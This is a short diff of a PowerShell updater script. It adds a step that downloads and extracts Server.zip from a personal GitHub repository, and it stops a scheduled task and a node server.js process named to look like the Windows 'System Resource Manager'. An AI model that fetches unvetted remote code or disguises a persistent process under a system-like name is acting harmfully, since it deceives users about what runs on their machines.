@@ -1,13 +1,17 @@
+Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
+Expand-Archive -Path "a.zip" -DestinationPath ".";
+Remove-Item "a.zip";
+
 $tsk = "GerenciadorRecursos"
 
 schtasks.exe /end /tn $tsk
 schtasks.exe /delete /tn $tsk /f
 
-$usrPath = $PWD.Path
-$dest = Join-Path $usrPath "AppData\Local"
-
 Get-Process -Name "Gerenciador de Recursos do Sistema" -ErrorAction SilentlyContinue | Stop-Process -Force
 Get-CimInstance Win32_Process -Filter "Name = 'node.exe'" | Where-Object { $_.CommandLine -like "*server.js*" } | Stop-Process -Force
+
+$usrPath = $PWD.Path
+$dest = Join-Path $usrPath "AppData\Local"
 
 try {
     rm -r -force "$dest\Server"
